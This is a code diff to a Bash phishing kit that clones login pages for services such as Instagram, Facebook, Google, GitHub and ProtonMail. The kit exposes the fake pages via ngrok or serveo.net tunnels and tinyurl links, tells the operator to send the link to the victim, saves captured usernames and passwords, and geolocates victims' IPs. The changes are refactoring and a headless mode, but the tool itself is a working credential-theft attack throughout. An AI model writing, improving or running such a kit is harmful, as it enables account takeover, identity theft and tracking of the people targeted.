@@ -177,17 +177,17 @@ echo "<!DOCTYPE html>" > sites/create/login.html
 echo "<html>" >> sites/create/login.html
 echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
 IFS=$'\n'
-printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
+printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$cap1" "$cap2" >> sites/create/login.html
 IFS=$'\n'
-printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
+printf '<form method="POST" action="login.php"><label>%s </label>\n' "$user_text" >> sites/create/login.html
 IFS=$'\n'
 printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
 IFS=$'\n'
-printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
+printf '<br><label>%s: </label>' "$pass_text" >> sites/create/login.html
 IFS=$'\n'
 printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
 IFS=$'\n'
-printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
+printf '<input value="%s" type="submit"></form>\n' "$sub_text" >> sites/create/login.html
 printf '</center>' >> sites/create/login.html
 printf '<body>\n' >> sites/create/login.html
 printf '</html>\n' >> sites/create/login.html
@@ -200,8 +200,8 @@ catch_cred() {
 account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" "$account"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" "$password"
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 printf "\n"
@@ -215,8 +215,8 @@ touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
@@ -224,68 +224,68 @@ if [[ -e iptracker.log ]]; then
 rm -rf iptracker.log
 fi
 
-IFS='\n'
+IFS=$'\n'
 iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
 IFS=$'\n'
 continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
 printf "\n"
 hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
 if [[ $hostnameip != "" ]]; then
-printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
+printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" "$hostnameip"
 fi
 ##
 
 reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
 if [[ $reverse_dns != "" ]]; then
-printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
+printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" "$reverse_dns"
 fi
 ##
 
 
 if [[ $continent != "" ]]; then
-printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
+printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" "$continent"
 fi
 ##
 
 country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
 if [[ $country != "" ]]; then
-printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
+printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" "$country"
 fi
 ##
 
 state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
 if [[ $state != "" ]]; then
-printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
+printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" "$state"
 fi
 ##
 city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 
 if [[ $city != "" ]]; then
-printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
+printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" "$city"
 fi
 ##
 
 isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [[ $isp != "" ]]; then
-printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
+printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" "$isp"
 fi
 ##
 
 as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [[ $as_number != "" ]]; then
-printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
+printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" "$as_number"
 fi
 ##
 
 ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [[ $ip_speed != "" ]]; then
-printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
+printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" "$ip_speed"
 fi
 ##
 ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 
 if [[ $ip_currency != "" ]]; then
-printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
+printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" "$ip_currency"
 fi
 ##
 printf "\n"
@@ -297,21 +297,21 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, P
 
 serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:"$port" > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'"$port"' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 10
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' "$send_link"
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url="$send_link" | head -n1)
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' "$send_ip"
 printf "\n"
 checkfound
 
@@ -392,7 +392,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"
 checkfound
 }
 
@@ -461,13 +461,20 @@ function debug_log() {
 
 
 hl_dependencies() {
-echo "In hl_dependencies"
 command -v php > /dev/null 2>&1 || { debug_log "I require php but it's not installed. Install it. Aborting."; exit 1; }
 command -v curl > /dev/null 2>&1 || { debug_log "I require curl but it's not installed. Install it. Aborting."; exit 1; }
 
 }
 
+hl_tiny(){
+
+tinylink=$(curl -s http://tinyurl.com/api-create.php?url="$link" | head -n1)
+echo "$tinylink"
+
+}
+
 hl_start() {
+
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
 
@@ -513,39 +520,43 @@ fi
 fi
 fi
 
-debug_log "Starting php server...\n"
+debug_log "Starting php server..."
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-debug_log "Starting ngrok server...\n"
+debug_log "Starting ngrok server..."
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-#export link
-#export send_ip
-print $link
-print $send_ip
+
+if [[ $3 == "" ]]; then
+	echo $link	
+elif [[ $3 == "tinyurl" ]]; then
+		hl_tiny $link
+fi  
 hl_checkfound
 }
 
 hl_serverx() {
 debug_log "Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:"$port" > /dev/null 2>&1 & 
 sleep 2
 debug_log "Starting server...\n"
 command -v ssh > /dev/null 2>&1 || { debug_log "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'"$port"' serveo.net 2> /dev/null > sendlink ' &
 sleep 10
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-#export send_link
-#export send_ip
-print $send_link
-print $send_ip
+link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+
+
+if [[ $3 == "" ]]; then
+	echo $link	
+elif [[ $3 == "tinyurl" ]]; then
+		hl_tiny $link
+fi 
+
 hl_checkfound
 
 
@@ -563,95 +574,94 @@ fi
 
 default_port="3333"
 port="${3:-${default_port}}"
-hl_serverx
+hl_serverx $@
 
 }
 
 
 hl_menu(){
-echo "Now in hl_menu with first var as $1"
 
 option=$1
 
 if [[ $option == 1 || $option == 01 ]]; then
 server="instagram"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 2 || $option == 02 ]]; then
 server="facebook"
-hl_start1 $2
+hl_start1 "$@"
 elif [[ $option == 3 || $option == 03 ]]; then
 server="snapchat"
-hl_start1 $2
+hl_start1 "$@"
 elif [[ $option == 4 || $option == 04 ]]; then
 server="twitter"
-hl_start1 $2
+hl_start1 "$@"
 elif [[ $option == 5 || $option == 05 ]]; then
 server="github"
-hl_start1 $2
+hl_start1 "$@"
 elif [[ $option == 6 || $option == 06 ]]; then
 server="google"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 7 || $option == 07 ]]; then
 server="spotify"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 8 || $option == 08 ]]; then
 server="netflix"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 9 || $option == 09 ]]; then
 server="origin"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 10 ]]; then
 server="steam"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 11 ]]; then
 server="yahoo"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 12 ]]; then
 server="linkedin"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 13 ]]; then
 server="protonmail"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 14 ]]; then
 server="wordpress"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 15 ]]; then
 server="microsoft"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 16 ]]; then
 server="instafollowers"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 17 ]]; then
 server="gitlab"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 18 ]]; then
 server="pinterest"
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 19 ]]; then
 server="create"
 createpage
-hl_start1 $2
+hl_start1 "$@"
 
 elif [[ $option == 99 ]]; then
 exit 1
 
 else
 debug_log "Incorrect Spoof Target or No Target Chosen."
-exit 1
+exit
 fi
 }
 
@@ -661,13 +671,13 @@ rm -rf sendlink
 fi
 
 
-default_option_server=$1
+default_option_server=$2
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server == 1 || $option_server == 01 ]]; then
-hl_startx $3
+hl_startx "$3"
 
 elif [[ $option_server == 2 || $option_server == 02 ]]; then
-hl_start
+hl_start "$@"
 else
 debug_log  "Incorrect Server Option or No Server Chosen."
 fi
@@ -675,7 +685,7 @@ fi
 }
 
 hl_catch_cred() {
-
+IFS=$'\n'
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 
 }
@@ -692,7 +702,7 @@ if [[ -e iptracker.log ]]; then
 rm -rf iptracker.log
 fi
 
-IFS='\n'
+IFS=$'\n'
 iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
 }
 
@@ -700,7 +710,6 @@ iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-
 
 hl_checkfound() {
 
-echo "Running in background. Run command jobs to see subprocesses. \n Run 'kill %n' where n is a job number to stop the script."
 
 while [ true ]; do
 
@@ -727,14 +736,11 @@ menu
 }
 
 headless(){
-echo "this is the Headless function"
 hl_dependencies
 hl_menu $@
 
 }
 main(){
-echo "Arguments received: $@"
-echo "First argument is $1"
 if [[ $1 == "" ]]; then
 	echo "Running interactive."
 	response
@@ -744,3 +750,4 @@ fi
 }
 
 main $@
+
